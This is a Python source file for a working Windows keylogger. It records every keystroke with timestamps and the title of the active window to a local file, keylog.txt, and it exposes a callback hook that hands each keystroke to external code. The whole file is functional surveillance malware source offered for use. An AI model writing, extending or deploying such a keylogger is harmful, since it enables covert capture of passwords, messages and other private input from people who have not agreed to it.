# -*- coding: utf-8 -*-
"""
winlog.py - Windows Keylogger with Window Information

Simple keylogger that captures keystrokes and tracks active window.
Windows only - uses pygetwindow for window detection.

Usage:
    python winlog.py
    
Press ESC to stop.
"""

from pynput import keyboard
from datetime import datetime

try:
    import pygetwindow as gw
    HAS_PYGETWINDOW = True
except ImportError:
    HAS_PYGETWINDOW = False
    print("[!] pygetwindow not found, window tracking disabled")
    print("[!] install with: pip install pygetwindow")

# config
OUTPUT_FILE = 'keylog.txt'
ENABLE_TIMESTAMPS = True

# track last window to detect changes
last_window_title = ""

# optional callback for external actions
_action_callback = None


def get_active_window_title():
    """
    get title of currently active window.
    returns 'Desktop' if no window is focused or on desktop.
    """
    if not HAS_PYGETWINDOW:
        return "Unknown"
    
    try:
        active_window = gw.getActiveWindow()

        # no window active (desktop or lock screen)
        if active_window is None:
            return "Desktop"

        title = active_window.title

        # windows specific desktop titles
        if title == "Program Manager":
            return "Desktop"
        elif title == "":
            return "Desktop"
        else:
            return title
            
    except Exception:
        return "Desktop"


def on_press(key):
    """
    called on every key press.
    logs key and window info to file.
    calls action callback if set (non-blocking).
    """
    global last_window_title
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    current_window = get_active_window_title()
    
    # get key string
    if hasattr(key, 'char') and key.char:
        key_str = key.char
        key_type = 'char'
    else:
        key_str = str(key).replace('Key.', '')
        key_type = 'special'

    # call action callback non-blocking if set
    if _action_callback:
        import threading
        threading.Thread(
            target=_action_callback,
            args=(key_str, key_type, current_window, timestamp),
            daemon=True
        ).start()

    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            # log window change
            if current_window != last_window_title:
                f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                last_window_title = current_window

            # log the key
            if key_type == 'char':
                if ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] Key: {key_str}\n')
                else:
                    f.write(key_str)
            else:
                if key_str == 'space':
                    f.write(' ')
                elif key_str == 'enter':
                    f.write('\n')
                elif ENABLE_TIMESTAMPS:
                    f.write(f'[{timestamp}] [{key_str}]\n')
                else:
                    f.write(f'[{key_str}]')
                
    except Exception as e:
        print(f"[ERROR] {e}")


def on_release(key):
    """
    called on key release.
    stops logger when ESC is pressed.
    """
    if key == keyboard.Key.esc:
        print("[*] ESC pressed, stopping...")
        return False


def loggerFunction(action=None):
    """
    main keylogger function.
    
    args:
        action: optional callback function(key_str, key_type, window, timestamp)
                called non-blocking on each key press.
                key_str: the key pressed (char or special key name)
                key_type: 'char' or 'special'
                window: current active window title
                timestamp: time of key press
    """
    global _action_callback
    _action_callback = action
    
    print("[*] Windows Keylogger Started")
    print(f"[*] Output: {OUTPUT_FILE}")
    print(f"[*] Timestamps: {ENABLE_TIMESTAMPS}")
    print(f"[*] Action callback: {'enabled' if action else 'disabled'}")
    print("[*] Press ESC to stop\n")
    
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    
    _action_callback = None
    print("[*] Keylogger stopped.")


# run if executed directly
if __name__ == "__main__":
    loggerFunction()
